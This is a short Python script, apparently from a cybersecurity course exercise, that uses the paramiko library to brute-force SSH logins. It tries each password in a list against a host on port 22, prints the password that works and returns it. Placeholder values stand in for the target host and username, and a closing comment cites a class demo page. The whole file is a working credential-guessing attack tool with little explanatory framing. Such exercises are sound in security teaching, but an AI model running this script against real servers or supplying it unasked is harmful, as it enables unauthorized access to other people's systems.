import paramiko

def ssh_bruteforce(host, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    for password in password_list:
        try:
            ssh.connect(host, port=22, username=username, password=password, timeout=3)
            print(f"Success! Password for {username}@{host} is {password}")
            return password
        except paramiko.AuthenticationException:
            print(f"Trying password: {password} - Failed")
        except Exception as e:
            print(f"Error: {e}")
            break
    return None

# Example usage:
host = "your_ssh_server_ip"
username = "known_username"
password_list = ["password1", "password2", "password3"]  # This should be read from a file

found_password = ssh_bruteforce(host, username, password_list)
if found_password:
    print(f"Found password: {found_password}")
else:
    print("Password not found in the provided list.")





# Sources: 
# https://github.com/codefellows/seattle-cybersecurity-401d8/blob/main/class-16/challenges/DEMO.md
# https://openai.com 